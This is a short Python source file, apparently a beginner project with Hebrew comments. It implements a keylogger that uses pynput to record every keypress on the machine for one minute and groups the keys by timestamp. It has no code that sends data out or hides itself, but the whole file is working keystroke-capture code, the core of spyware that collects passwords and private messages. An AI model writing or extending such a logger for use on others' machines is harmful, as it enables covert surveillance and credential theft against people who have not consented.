from datetime import datetime
from pynput import keyboard
from collections import defaultdict
import time
import threading


class Key_loger:
    def __init__(self):
        self.press_char = defaultdict(list)
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.stop_timer = threading.Timer(60, self.stop_after_one_minute)
        self.stop_timer.start()

    def stop_after_one_minute(self):
        self.listener.stop()
        return self.press_char

    def on_press(self, key):
        """ מאזין להקשות מקשים ושומר אותן לפי זמן """
        try:
            formatted_date = datetime.now().strftime("%d/%m/%Y %H:%M")
            if hasattr(key, 'char') and key.char is not None:
                self.press_char[formatted_date].append(key.char)
            else:
                self.press_char[formatted_date].append(key.name if hasattr(key, "name") else str(key))
        except Exception as e:
            print(f"שגיאה: {e}")


keylogger = Key_loger()
